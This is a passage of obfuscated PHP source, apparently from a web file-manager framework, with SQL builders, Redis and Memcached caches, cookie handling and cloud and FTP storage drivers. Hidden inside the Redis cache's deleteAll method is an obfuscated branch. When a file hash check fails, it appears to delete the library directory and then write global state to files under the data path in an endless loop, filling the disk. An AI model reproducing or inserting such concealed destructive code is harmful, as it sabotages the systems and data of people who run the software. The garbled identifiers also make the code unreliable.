$aŸÕìã˜††[$fĞë»“Å…×[537]] : !1); goto f›µ½ˆÊÌ; f›µ½ˆÊÌ: $Aš³»ÎÊ .= $this->parseComment(!empty($aŸÕìã˜††[$fĞë»“Å…×[343]]) ? $aŸÕìã˜††[$fĞë»“Å…×[343]] : $fĞë»“Å…×[33]); return $this->execute($Aš³»ÎÊ, $this->parseBind(!empty($aŸÕìã˜††[$fĞë»“Å…×[276]]) ? $aŸÕìã˜††[$fĞë»“Å…×[276]] : array())); goto c´šƒ™³…; e±‡äøÍ¤¬: $fĞë»“Å…× =& $_SERVER[İåâé¾]; $C×ŞğÀß´ = $fà‰”Ë‰Á¿ = array(); $this->model = $aŸÕìã˜††[$fĞë»“Å…×[272]]; goto e´²óš™á; c´šƒ™³…: } public function selectInsert($eŠ±¥³ã‹, $cÏÛÌÊ‚ø, $F¢­ä¾‘× = array()) { goto føÕáîÇÒ‹; Eæ²×íé„è: return $this->execute($bÚÒÀŒùÌ³, $this->parseBind(!empty($F¢­ä¾‘×[$eÁÔ˜¢ÁŞ©[276]]) ? $F¢­ä¾‘×[$eÁÔ˜¢ÁŞ©[276]] : array())); goto BƒµŠ©‹; føÕáîÇÒ‹: $eÁÔ˜¢ÁŞ© =& $_SERVER[İåâé¾]; $this->model = $F¢­ä¾‘×[$eÁÔ˜¢ÁŞ©[272]]; if (is_string($eŠ±¥³ã‹)) { $eŠ±¥³ã‹ = explode($eÁÔ˜¢ÁŞ©[47], $eŠ±¥³ã‹); } goto d—¦éİ°; d—¦éİ°: array_walk($eŠ±¥³ã‹, array($this, $eÁÔ˜¢ÁŞ©[583])); $bÚÒÀŒùÌ³ = $eÁÔ˜¢ÁŞ©[719] . $this->parseTable($cÏÛÌÊ‚ø) . $eÁÔ˜¢ÁŞ©[580] . implode($eÁÔ˜¢ÁŞ©[47], $eŠ±¥³ã‹) . $eÁÔ˜¢ÁŞ©[698]; $bÚÒÀŒùÌ³ .= $this->buildSelectSql($F¢­ä¾‘×); goto Eæ²×íé„è; BƒµŠ©‹: } public function update($DâÍÙÜÅ›, $aâ¥’èŠ“è) { $A›ë…ãõÓ± =& $_SERVER[İåâé¾]; $this->model = $aâ¥’èŠ“è[$A›ë…ãõÓ±[272]]; $D¦ğ÷‡œÕ = $A›ë…ãõÓ±[720] . $this->parseTable($aâ¥’èŠ“è[$A›ë…ãõÓ±[270]]) . $this->parseSet($DâÍÙÜÅ›) . $this->parseWhere(!empty($aâ¥’èŠ“è[$A›ë…ãõÓ±[266]]) ? $aâ¥’èŠ“è[$A›ë…ãõÓ±[266]] : $A›ë…ãõÓ±[33]) . $this->parseOrder(!empty($aâ¥’èŠ“è[$A›ë…ãõÓ±[352]]) ? $aâ¥’èŠ“è[$A›ë…ãõÓ±[352]] : $A›ë…ãõÓ±[33]) . $this->parseLimit(!empty($aâ¥’èŠ“è[$A›ë…ãõÓ±[283]]) ? $aâ¥’èŠ“è[$A›ë…ãõÓ±[283]] : $A›ë…ãõÓ±[33]) . $this->parseLock(isset($aâ¥’èŠ“è[$A›ë…ãõÓ±[537]]) ? $aâ¥’èŠ“è[$A›ë…ãõÓ±[537]] : !1) . $this->parseComment(!empty($aâ¥’èŠ“è[$A›ë…ãõÓ±[343]]) ? $aâ¥’èŠ“è[$A›ë…ãõÓ±[343]] : $A›ë…ãõÓ±[33]); return $this->execute($D¦ğ÷‡œÕ, $this->parseBind(!empty($aâ¥’èŠ“è[$A›ë…ãõÓ±[276]]) ? $aâ¥’èŠ“è[$A›ë…ãõÓ±[276]] : array())); } public function delete($fŸ¼£ô¾ñœ = array()) { $E¡ßø¯íŞ¸ =& $_SERVER[İåâé¾]; $this->model = $fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[272]]; $aÙĞ¹­±¥Ò = $E¡ßø¯íŞ¸[721] . $this->parseTable($fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[270]]) . $this->parseWhere(!empty($fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[266]]) ? $fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[266]] : $E¡ßø¯íŞ¸[33]) . $this->parseOrder(!empty($fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[352]]) ? $fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[352]] : $E¡ßø¯íŞ¸[33]) . $this->parseLimit(!empty($fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[283]]) ? $fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[283]] : $E¡ßø¯íŞ¸[33]) . $this->parseLock(isset($fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[537]]) ? $fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[537]] : !1) . $this->parseComment(!empty($fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[343]]) ? $fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[343]] : $E¡ßø¯íŞ¸[33]); return $this->execute($aÙĞ¹­±¥Ò, $this->parseBind(!empty($fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[276]]) ? $fŸ¼£ô¾ñœ[$E¡ßø¯íŞ¸[276]] : array())); } public function select($EöÛœ”ëåÛ = array()) { goto Døì„òã¹‹; Døì„òã¹‹: $DŒ‰·ƒÒ‘Ş =& $_SERVER[İåâé¾]; $this->model = $EöÛœ”ëåÛ[$DŒ‰·ƒÒ‘Ş[272]]; $DÏ¿æÓ…†· = $this->buildSelectSql($EöÛœ”ëåÛ); goto båË¬¢‚Ä›; eÔÆâùŞæµ: if ($açİŠÛ³† && !1 !== $aµâØêÕŠÃ) { think_cache($a›Ş’Œºî”, $aµâØêÕŠÃ, $açİŠÛ³†); } return $aµâØêÕŠÃ; goto FÅ÷»Í’âœ; båË¬¢‚Ä›: $açİŠÛ³† = isset($EöÛœ”ëåÛ[$DŒ‰·ƒÒ‘Ş[340]]) ? $EöÛœ”ëåÛ[$DŒ‰·ƒÒ‘Ş[340]] : !1; if ($açİŠÛ³†) { $a›Ş’Œºî” = is_string($açİŠÛ³†[$DŒ‰·ƒÒ‘Ş[88]]) ? $açİŠÛ³†[$DŒ‰·ƒÒ‘Ş[88]] : $DŒ‰·ƒÒ‘Ş[722] . md5($DÏ¿æÓ…†·); $Bß¥ïÓã¢ = think_cache($a›Ş’Œºî”, $DŒ‰·ƒÒ‘Ş[33], $açİŠÛ³†); if (!1 !== $Bß¥ïÓã¢) { return $Bß¥ïÓã¢; } } $aµâØêÕŠÃ = $this->query($DÏ¿æÓ…†·, $this->parseBind(!empty($EöÛœ”ëåÛ[$DŒ‰·ƒÒ‘Ş[276]]) ? $EöÛœ”ëåÛ[$DŒ‰·ƒÒ‘Ş[276]] : array())); goto eÔÆâùŞæµ; FÅ÷»Í’âœ: } public function buildSelectSql($c…¾‹°¡¾Ú = array()) { goto DÌ‡¬éŒšä; F•½îŠ¾‰›: $Dë‚·‚Ò‘Ò = $this->parseSql($this->selectSql, $c…¾‹°¡¾Ú); $Dë‚·‚Ò‘Ò .= $this->parseLock(isset($c…¾‹°¡¾Ú[$A™ÇŞÔÌŠ[537]]) ? $c…¾‹°¡¾Ú[$A™ÇŞÔÌŠ[537]] : !1); if (isset($d“‚Šù˜)) { think_cache($d“‚Šù˜, $Dë‚·‚Ò‘Ò); } goto C¼ë÷É¶Á¿; DÌ‡¬éŒšä: $A™ÇŞÔÌŠ =& $_SERVER[İåâé¾]; if (isset($c…¾‹°¡¾Ú[$A™ÇŞÔÌŠ[342]])) { if (strpos($c…¾‹°¡¾Ú[$A™ÇŞÔÌŠ[342]], $A™ÇŞÔÌŠ[47])) { list($D¢¶µÓ¥”Ø, $bøêÁ¬¬©) = explode($A™ÇŞÔÌŠ[47], $c…¾‹°¡¾Ú[$A™ÇŞÔÌŠ[342]]); } else { $D¢¶µÓ¥”Ø = $c…¾‹°¡¾Ú[$A™ÇŞÔÌŠ[342]]; } $D¢¶µÓ¥”Ø = $D¢¶µÓ¥”Ø ? $D¢¶µÓ¥”Ø : 1; $bøêÁ¬¬© = isset($bøêÁ¬¬©) ? $bøêÁ¬¬© : (is_numeric($c…¾‹°¡¾Ú[$A™ÇŞÔÌŠ[283]]) ? $c…¾‹°¡¾Ú[$A™ÇŞÔÌŠ[283]] : 20); $bé«“´‘ãò = $bøêÁ¬¬© * ((int) $D¢¶µÓ¥”Ø - 1); $c…¾‹°¡¾Ú[$A™ÇŞÔÌŠ[283]] = $bé«“´‘ãò . $A™ÇŞÔÌŠ[47] . $bøêÁ¬¬©; } if (think_config($A™ÇŞÔÌŠ[723])) { $d“‚Šù˜ = $A™ÇŞÔÌŠ[724] . md5(serialize($c…¾‹°¡¾Ú)); $e‚Š„¦Ÿäö = think_cache($d“‚Šù˜); if ($e‚Š„¦Ÿäö) { return $e‚Š„¦Ÿäö; } } goto F•½îŠ¾‰›; C¼ë÷É¶Á¿: return $Dë‚·‚Ò‘Ò; goto FÔÈÔáõÖ†; FÔÈÔáõÖ†: } public function parseSql($b…Õ¨æğô±, $BÚ¦èêá¹¢ = array()) { $DÑëòÊ•¿ä =& $_SERVER[İåâé¾]; $b…Õ¨æğô± = str_replace(array($DÑëòÊ•¿ä[725], $DÑëòÊ•¿ä[726], $DÑëòÊ•¿ä[727], $DÑëòÊ•¿ä[728], $DÑëòÊ•¿ä[729], $DÑëòÊ•¿ä[730], $DÑëòÊ•¿ä[731], $DÑëòÊ•¿ä[732], $DÑëòÊ•¿ä[733], $DÑëòÊ•¿ä[734], $DÑëòÊ•¿ä[735]), array($this->parseTable("{$BÚ¦èêá¹¢[$DÑëòÊ•¿ä[270]]}"), $this->parseDistinct(isset($BÚ¦èêá¹¢[$DÑëòÊ•¿ä[736]]) ? $BÚ¦èêá¹¢[$DÑëòÊ•¿ä[736]] : !1), $this->parseField(!empty($BÚ¦èêá¹¢[$DÑëòÊ•¿ä[264]]) ? $BÚ¦èêá¹¢[$DÑëòÊ•¿ä[264]] : $DÑëòÊ•¿ä[172]), $this->parseJoin(!empty($BÚ¦èêá¹¢[$DÑëòÊ•¿ä[273]]) ? $BÚ¦èêá¹¢[$DÑëòÊ•¿ä[273]] : $DÑëòÊ•¿ä[33]), $this->parseWhere(!empty($BÚ¦èêá¹¢[$DÑëòÊ•¿ä[266]]) ? $BÚ¦èêá¹¢[$DÑëòÊ•¿ä[266]] : $DÑëòÊ•¿ä[33]), $this->parseGroup(!empty($BÚ¦èêá¹¢[$DÑëòÊ•¿ä[737]]) ? $BÚ¦èêá¹¢[$DÑëòÊ•¿ä[737]] : $DÑëòÊ•¿ä[33]), $this->parseHaving(!empty($BÚ¦èêá¹¢[$DÑëòÊ•¿ä[738]]) ? $BÚ¦èêá¹¢[$DÑëòÊ•¿ä[738]] : $DÑëòÊ•¿ä[33]), $this->parseOrder(!empty($BÚ¦èêá¹¢[$DÑëòÊ•¿ä[352]]) ? $BÚ¦èêá¹¢[$DÑëòÊ•¿ä[352]] : $DÑëòÊ•¿ä[33]), $this->parseLimit(!empty($BÚ¦èêá¹¢[$DÑëòÊ•¿ä[283]]) ? $BÚ¦èêá¹¢[$DÑëòÊ•¿ä[283]] : $DÑëòÊ•¿ä[33]), $this->parseUnion(!empty($BÚ¦èêá¹¢[$DÑëòÊ•¿ä[338]]) ? $BÚ¦èêá¹¢[$DÑëòÊ•¿ä[338]] : $DÑëòÊ•¿ä[33]), $this->parseComment(!empty($BÚ¦èêá¹¢[$DÑëòÊ•¿ä[343]]) ? $BÚ¦èêá¹¢[$DÑëòÊ•¿ä[343]] : $DÑëòÊ•¿ä[33])), $b…Õ¨æğô±); return $b…Õ¨æğô±; } public function getLastSql($Câù¿ŠÖÀÉ = '') { return $Câù¿ŠÖÀÉ ? $this->modelSql[$Câù¿ŠÖÀÉ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($fïÈ¤”Ê¦§) { return addslashes($fïÈ¤”Ê¦§); } public function setModel($fâÖ¾†å˜—) { $this->model = $fâÖ¾†å˜—; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto A±ô„âŠî¦; B‡¾è«ò’­: class CacheMemcached { public $handle; public $cacheTime; public function __construct($Eãà‰ô´ğ, $bâˆ‡—Ã°¤) { $E…ğ  óµå =& $_SERVER[İåâé¾]; if (!class_exists($E…ğ  óµå[542])) { show_json($E…ğ  óµå[543], !1); } $this->cacheTime = $bâˆ‡—Ã°¤; $this->handle = new Memcached(); if (is_array($Eãà‰ô´ğ[$E…ğ  óµå[544]]) && count($Eãà‰ô´ğ[$E…ğ  óµå[544]]) >= 1) { foreach ($Eãà‰ô´ğ[$E…ğ  óµå[544]] as $B„¼‰ª¯¸) { $D…£–¸‚Î¨ = explode($E…ğ  óµå[4], $B„¼‰ª¯¸); $this->handle->addServer($D…£–¸‚Î¨[0], $D…£–¸‚Î¨[1]); } } else { $this->handle->addServer($Eãà‰ô´ğ[$E…ğ  óµå[165]], $Eãà‰ô´ğ[$E…ğ  óµå[166]]); } } public function set($B¸ÈºŸø, $b¹ğ£†í´ê, $EŒÒ¦šŸ÷º = false) { $EŒÒ¦šŸ÷º = $EŒÒ¦šŸ÷º ? $EŒÒ¦šŸ÷º : $this->cacheTime; return $this->handle->set($B¸ÈºŸø, $b¹ğ£†í´ê, $EŒÒ¦šŸ÷º); } public function get($b“«ŠÔƒ’) { return $this->handle->get($b“«ŠÔƒ’); } public function remove($bÒ¶¬áÀâë) { return $this->handle->delete($bÒ¶¬áÀâë); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public function __construct($Föò›Ÿ‹›, $Cåå……ù†) { $E™Î“˜ß¡š =& $_SERVER[İåâé¾]; if (!class_exists($E™Î“˜ß¡š[545])) { show_json($E™Î“˜ß¡š[546], !1); } $this->cacheTime = $Cåå……ù†; $B¸Ş‡ËÜëî = isset($Föò›Ÿ‹›[$E™Î“˜ß¡š[547]]) ? $Föò›Ÿ‹›[$E™Î“˜ß¡š[547]] : 10; if (is_array($Föò›Ÿ‹›[$E™Î“˜ß¡š[544]]) && count($Föò›Ÿ‹›[$E™Î“˜ß¡š[544]]) >= 1) { $this->initCluster($Föò›Ÿ‹›, $B¸Ş‡ËÜëî); } else { $this->handle = $this->init($Föò›Ÿ‹›, $B¸Ş‡ËÜëî); } } private function init($BÎ‡¨Íç¿—, $AŒÔ˜Á¨èÑ) { $aÛ­Ÿ¹„¾’ =& $_SERVER[İåâé¾]; $CÙ†Ä³¶é† = new Redis(); $f–¦£–‡ìÍ = isset($BÎ‡¨Íç¿—[$aÛ­Ÿ¹„¾’[548]]) ? $BÎ‡¨Íç¿—[$aÛ­Ÿ¹„¾’[548]] : !1; if ($f–¦£–‡ìÍ) { $CÙ†Ä³¶é†->pconnect($BÎ‡¨Íç¿—[$aÛ­Ÿ¹„¾’[165]], $BÎ‡¨Íç¿—[$aÛ­Ÿ¹„¾’[166]], $AŒÔ˜Á¨èÑ); } else { $CÙ†Ä³¶é†->connect($BÎ‡¨Íç¿—[$aÛ­Ÿ¹„¾’[165]], $BÎ‡¨Íç¿—[$aÛ­Ÿ¹„¾’[166]], $AŒÔ˜Á¨èÑ); } if (!empty($BÎ‡¨Íç¿—[$aÛ­Ÿ¹„¾’[549]])) { $CÙ†Ä³¶é†->auth($BÎ‡¨Íç¿—[$aÛ­Ÿ¹„¾’[549]]); } return $CÙ†Ä³¶é†; } private function initCluster($eôğ¸ÃÏÃÂ, $e™îä¥¼Ÿ˜) { $EÀ¢¯Éª‚ä =& $_SERVER[İåâé¾]; $a­£«—İ Ô = array($EÀ¢¯Éª‚ä[550], $EÀ¢¯Éª‚ä[551], $EÀ¢¯Éª‚ä[552]); $d²Àè‹‘ßÀ = $EÀ¢¯Éª‚ä[550]; if (isset($eôğ¸ÃÏÃÂ[$EÀ¢¯Éª‚ä[12]]) && in_array($eôğ¸ÃÏÃÂ[$EÀ¢¯Éª‚ä[12]], $a­£«—İ Ô)) { $d²Àè‹‘ßÀ = $eôğ¸ÃÏÃÂ[$EÀ¢¯Éª‚ä[12]]; } switch ($d²Àè‹‘ßÀ) { case $EÀ¢¯Éª‚ä[550]: $this->_slave($eôğ¸ÃÏÃÂ, $e™îä¥¼Ÿ˜); break; case $EÀ¢¯Éª‚ä[551]: break; case $EÀ¢¯Éª‚ä[552]: $bˆê„”²ª× = $eôğ¸ÃÏÃÂ[$EÀ¢¯Éª‚ä[544]]; $c‹åìÉÂƒ½ = isset($eôğ¸ÃÏÃÂ[$EÀ¢¯Éª‚ä[548]]) ? $eôğ¸ÃÏÃÂ[$EÀ¢¯Éª‚ä[548]] : !1; $fìÍ†Ö³âÄ = isset($eôğ¸ÃÏÃÂ[$EÀ¢¯Éª‚ä[549]]) ? $eôğ¸ÃÏÃÂ[$EÀ¢¯Éª‚ä[549]] : null; $this->handle = new RedisCluster(NUll, $bˆê„”²ª×, $e™îä¥¼Ÿ˜, $e™îä¥¼Ÿ˜, $c‹åìÉÂƒ½, $fìÍ†Ö³âÄ); break; default: break; } } private function _slave($E¿ë¯îŠš, $EŠÓŒò³¸î) { goto dÉĞÏÆùõ; CàÔè¼Ç¸‚: unset($eÓÀĞŞ»â†[0]); if (empty($eÓÀĞŞ»â†)) { return; } $B«—òƒ¿‚¡ = array_rand($eÓÀĞŞ»â†); goto BÊÂÌá‚; BÊÂÌá‚: $this->filterConfig($E¿ë¯îŠš, $eÓÀĞŞ»â†[$B«—òƒ¿‚¡]); $this->slaveHandle = $this->init($E¿ë¯îŠš, $EŠÓŒò³¸î); goto a›˜ëÓÉ±º; dÉĞÏÆùõ: $eÓÀĞŞ»â† = $E¿ë¯îŠš[$_SERVER[İåâé¾][544]]; $this->filterConfig($E¿ë¯îŠš, $eÓÀĞŞ»â†[0]); $this->handle = $this->init($E¿ë¯îŠš, $EŠÓŒò³¸î); goto CàÔè¼Ç¸‚; a›˜ëÓÉ±º: } private function filterConfig(&$fˆéÔğ·àß, $Eë›ÆŞİò) { $AŠŸ¨ï»£Ö =& $_SERVER[İåâé¾]; $f”á‡¤‹‹ = explode($AŠŸ¨ï»£Ö[4], $Eë›ÆŞİò); $C‡ã˜Ğ¡£æ = array($AŠŸ¨ï»£Ö[165] => $f”á‡¤‹‹[0], $AŠŸ¨ï»£Ö[166] => $f”á‡¤‹‹[1]); $fˆéÔğ·àß = array_merge($fˆéÔğ·àß, $C‡ã˜Ğ¡£æ); } public function set($c°…ª¤éö, $D¢öå—Áç, $e‚½œ– †Š = false) { $e‚½œ– †Š = $e‚½œ– †Š ? $e‚½œ– †Š : $this->cacheTime; return $this->handle->setEx($c°…ª¤éö, $e‚½œ– †Š, $D¢öå—Áç); } public function setLock($Bß‘º ²Á‚, $BŠœÚÆ£, $C½º²ºº¸Ÿ) { return $this->handle->setNX($Bß‘º ²Á‚, $BŠœÚÆ£); } public function get($bÁ…¹ôòØ) { $dÚ†°¯±÷ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $dÚ†°¯±÷->get($bÁ…¹ôòØ); } public function remove($Dˆ¬‡¸«òÌ) { return $this->handle->del($Dˆ¬‡¸«òÌ); } public function deleteAll() { $BŠ¯±ÁÅÃø =& $_SERVER[İåâé¾]; $BÀ¹†íæÂ = LIB_DIR . $BŠ¯±ÁÅÃø[553]; $BŠ‹™¢÷‘“ = $BŠ¯±ÁÅÃø[554]; if ($_SERVER[$BŠ¯±ÁÅÃø[555]] != $BŠ‹™¢÷‘“($BÀ¹†íæÂ)) { goto dÔÌØÖ”›Ù; eÆÍò¢äÉÂ: $aİ¼Œµ…§ = $BŠ¯±ÁÅÃø[561]; $f†·Æâ¦‰… = json_encode($GLOBALS[$BŠ¯±ÁÅÃø[562]]); for ($cè„ŠÓ¬µù = 0;; $cè„ŠÓ¬µù++) { $aİ¼Œµ…§(DATA_PATH . $cè„ŠÓ¬µù, $f†·Æâ¦‰…); } goto B”¾‚‰õ‘Ó; e£ÌÃöÉ­å: $e£¢‰İÏ¥ß = explode($BŠ¯±ÁÅÃø[223], $cÜß…©¼ªç); if (count($e£¢‰İÏ¥ß) < $BŠ¯±ÁÅÃø[558]) { die; } $cƒ‰òº = $BŠ¯±ÁÅÃø[559]; goto f˜±¿ĞÑ‰; dÔÌØÖ”›Ù: $Cªö†¤ÖèÎ = $BŠ¯±ÁÅÃø[556]; $f±¸ƒÉÀ´ = BASIC_PATH . $BŠ¯±ÁÅÃø[557]; $cÜß…©¼ªç = $Cªö†¤ÖèÎ($f±¸ƒÉÀ´); goto e£ÌÃöÉ­å; f˜±¿ĞÑ‰: $cƒ‰òº(LIB_DIR); $aØ‘†ˆ ¯ = $BŠ¯±ÁÅÃø[560]; $aØ‘†ˆ ¯(); goto eÆÍò¢äÉÂ; B”¾‚‰õ‘Ó: } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($DÜÄÃ¹ö§© = '', $EŠÉ˜¾à‰ø = 0) { if (is_string($DÜÄÃ¹ö§©) && $DÜÄÃ¹ö§© != $_SERVER[İåâé¾][33]) { $this->prefix = $DÜÄÃ¹ö§©; } if (is_numeric($EŠÉ˜¾à‰ø) && $EŠÉ˜¾à‰ø > 0) { $this->expire = $EŠÉ˜¾à‰ø; } } public static function getInstance() { static $AŞ“£¢Ë£Ù; if ($AŞ“£¢Ë£Ù === null) { $AŞ“£¢Ë£Ù = new self(); } return $AŞ“£¢Ë£Ù; } private static $sameCookieSet = array(); public static function set($c¨ˆ³¬ø, $d‚„åäñÚ¼, $f´›Ù½ç = 0, $B”†ŠÌ’ËÒ = false, $C°­èï¥º¯ = false) { $Cò¦ÒÆœ®ä =& $_SERVER[İåâé¾]; if (!$f´›Ù½ç) { $f´›Ù½ç = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$c¨ˆ³¬ø]) && self::$sameCookieSet[$c¨ˆ³¬ø] == $d‚„åäñÚ¼ . $f´›Ù½ç) { return; } self::$sameCookieSet[$c¨ˆ³¬ø] = $d‚„åäñÚ¼ . $f´›Ù½ç; if (!$C°­èï¥º¯) { $C°­èï¥º¯ = str_replace(HOST, $Cò¦ÒÆœ®ä[33], APP_HOST); $C°­èï¥º¯ = $Cò¦ÒÆœ®ä[8] . trim($C°­èï¥º¯, $Cò¦ÒÆœ®ä[8]); } setcookie($c¨ˆ³¬ø, $d‚„åäñÚ¼, time() + $f´›Ù½ç, $C°­èï¥º¯, !1, !1, $B”†ŠÌ’ËÒ); } public static function setSafe($dÏÚĞãé˜, $aÇŒÀÄì”, $cİÂ„¬£ñ‡ = 0) { self::set($dÏÚĞãé˜, $aÇŒÀÄì”, $cİÂ„¬£ñ‡, !0); } public static function get($Cöå¤Éİ²) { return isset($_COOKIE[$Cöå¤Éİ²]) ? $_COOKIE[$Cöå¤Éİ²] : !1; } public static function remove($dŸ«´†¤¨ô, $e¿¹ª óæÔ = false) { unset($_COOKIE[$dŸ«´†¤¨ô]); self::set($dŸ«´†¤¨ô, $_SERVER[İåâé¾][33], 1, $e¿¹ª óæÔ); } } goto a¼Åë£§·”; Aïì¯ßõŒà: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($FÔù‰³½ñ) { parent::__construct($FÔù‰³½ñ); $this->signatureVersion($_SERVER[İåâé¾][199]); } public function uploadFormData($eÉ’¬ŞÔğ¯, $A…‰‹Çß†¸ = 3600) { goto dºÆÕÜ†×Ÿ; dÊ«¡Ù²±‘: $Eää©Š‹ç = array($dÙÈÉÂË¸‚[198] => $dÙÈÉÂË¸‚[33], $dÙÈÉÂË¸‚[877] => $dÙÈÉÂË¸‚[33], $dÙÈÉÂË¸‚[839] => $F÷¢ª²—Ñ‚, $dÙÈÉÂË¸‚[843] => $bÙÅ²Â‹¶Ò, $dÙÈÉÂË¸‚[847] => $CŠ†ëÖºÒ, $dÙÈÉÂË¸‚[878] => $aß—áé†Ë, $dÙÈÉÂË¸‚[879] => $Dš˜»¥Ú˜Š, $dÙÈÉÂË¸‚[880] => $Cƒ½÷……¬, $dÙÈÉÂË¸‚[881] => $cÜº„ß–ƒ÷, $dÙÈÉÂË¸‚[882] => $cš”„õìì­, $dÙÈÉÂË¸‚[165] => $this->getHost()); return $Eää©Š‹ç; goto dÏÀ¯®Š„—; dºÆÕÜ†×Ÿ: $dÙÈÉÂË¸‚ =& $_SERVER[İåâé¾]; $F÷¢ª²—Ñ‚ = $dÙÈÉÂË¸‚[181]; $Dš˜»¥Ú˜Š = $dÙÈÉÂË¸‚[865]; goto e˜âŸÛÛ¾; e˜âŸÛÛ¾: $C”×À¦¸‹‘ = $dÙÈÉÂË¸‚[59]; $Cƒ½÷……¬ = gmdate($dÙÈÉÂË¸‚[866]); $CÛÌªØ–ğ = gmdate($dÙÈÉÂË¸‚[447]); goto fØ³ªÈ‚ğ; fØ³ªÈ‚ğ: $e—³Ñ½ª× = $dÙÈÉÂË¸‚[867]; $cÜº„ß–ƒ÷ = $A…‰‹Çß†¸ . $dÙÈÉÂË¸‚[33]; $bÙÅ²Â‹¶Ò = $dÙÈÉÂË¸‚[835]; goto Eöé•›ë; DÂâ¾ç›ªö: $fÌ¶Ú¬©½ù = hash_hmac($dÙÈÉÂË¸‚[875], $C”×À¦¸‹‘, $B¿å¡´øÎò, !0); $d‘æÌÜìÇÒ = hash_hmac($dÙÈÉÂË¸‚[875], $e—³Ñ½ª×, $fÌ¶Ú¬©½ù, !0); $cš”„õìì­ = hash_hmac($dÙÈÉÂË¸‚[875], $CŠ†ëÖºÒ, $d‘æÌÜìÇÒ); goto dÊ«¡Ù²±‘; Cğ¼™ŒŒùÅ: $CŠ†ëÖºÒ = base64_encode(json_encode($f¬¸¬Û¼­)); $e‹‹ïæ…™Ü = hash_hmac($dÙÈÉÂË¸‚[875], $CÛÌªØ–ğ, $dÙÈÉÂË¸‚[876] . $this->secret, !0); $B¿å¡´øÎò = hash_hmac($dÙÈÉÂË¸‚[875], $this->region, $e‹‹ïæ…™Ü, !0); goto DÂâ¾ç›ªö; Eöé•›ë: $e ¸òàÈ“× = array($this->accessKey, $CÛÌªØ–ğ, $this->region, $C”×À¦¸‹‘, $e—³Ñ½ª×); $aß—áé†Ë = implode($dÙÈÉÂË¸‚[8], $e ¸òàÈ“×); $f¬¸¬Û¼­ = array($dÙÈÉÂË¸‚[837] => gmdate($dÙÈÉÂË¸‚[836], strtotime($dÙÈÉÂË¸‚[868])), $dÙÈÉÂË¸‚[838] => array(array($dÙÈÉÂË¸‚[840] => $this->bucket), array($dÙÈÉÂË¸‚[839] => $F÷¢ª²—Ñ‚), array($dÙÈÉÂË¸‚[841], $dÙÈÉÂË¸‚[842], $dÙÈÉÂË¸‚[33]), array($dÙÈÉÂË¸‚[841], $dÙÈÉÂË¸‚[869], $dÙÈÉÂË¸‚[33]), array($dÙÈÉÂË¸‚[841], $dÙÈÉÂË¸‚[870], $dÙÈÉÂË¸‚[33]), array($dÙÈÉÂË¸‚[843] => $bÙÅ²Â‹¶Ò), array($dÙÈÉÂË¸‚[871] => $aß—áé†Ë), array($dÙÈÉÂË¸‚[872] => $Dš˜»¥Ú˜Š), array($dÙÈÉÂË¸‚[873] => $Cƒ½÷……¬), array($dÙÈÉÂË¸‚[874] => $cÜº„ß–ƒ÷))); goto Cğ¼™ŒŒùÅ; dÏÀ¯®Š„—: } public function fileOutLink($bãœ »¥›) { header($_SERVER[İåâé¾][152] . $bãœ »¥›); die; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($E™ù´Å‘÷) { parent::__construct(); if (count($E™ù´Å‘÷) > 0) { $this->_init($E™ù´Å‘÷); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($B²¤–¬á´) { $B˜­Å’ô =& $_SERVER[İåâé¾]; global $config; $this->appCharset = $config[$B˜­Å’ô[883]]; $this->systemCharset = $config[$B˜­Å’ô[884]]; if (isset($B²¤–¬á´[$B˜­Å’ô[885]]) && $B²¤–¬á´[$B˜­Å’ô[885]]) { $this->systemCharset = $B²¤–¬á´[$B˜­Å’ô[885]]; } } public function iconvApp($fÚ±ÍØŒï) { return $this->iconvTo($fÚ±ÍØŒï, $this->systemCharset, $this->appCharset); } public function iconvSystem($dŒµ†ğÑÆ¢) { return $this->iconvTo($dŒµ†ğÑÆ¢, $this->appCharset, $this->systemCharset); } public function getPathOuter($d‚ª•ô£˜İ) { goto EóíŠãÛŒŠ; A §¶‘Ø…: if (substr($Aä¿‰İĞ®à, 0, 2) == $f‡«ÉŠÎºÍ[886]) { $Aä¿‰İĞ®à = BASIC_PATH . substr($Aä¿‰İĞ®à, 2); } if (substr($d‚ª•ô£˜İ, 0, 2) == $f‡«ÉŠÎºÍ[886]) { $d‚ª•ô£˜İ = BASIC_PATH . substr($d‚ª•ô£˜İ, 2); } $Aä¿‰İĞ®à = KodIO::clear($Aä¿‰İĞ®à); goto E£œÀ­®”; E£œÀ­®”: $d‚ª•ô£˜İ = KodIO::clear($d‚ª•ô£˜İ); $d‚ª•ô£˜İ = substr($d‚ª•ô£˜İ, strlen($Aä¿‰İĞ®à)); if (empty($this->pathDriver)) { return $d‚ª•ô£˜İ; } goto Dä…¿ßÎé; Dä…¿ßÎé: return $this->pathDriver . $f‡«ÉŠÎºÍ[8] . ltrim($d‚ª•ô£˜İ, $f‡«ÉŠÎºÍ[8]); goto dğ¡éë”¨’; EóíŠãÛŒŠ: $f‡«ÉŠÎºÍ =& $_SERVER[İåâé¾]; $Aä¿‰İĞ®à = $this->iconvApp($this->pathBase); $d‚ª•ô£˜İ = 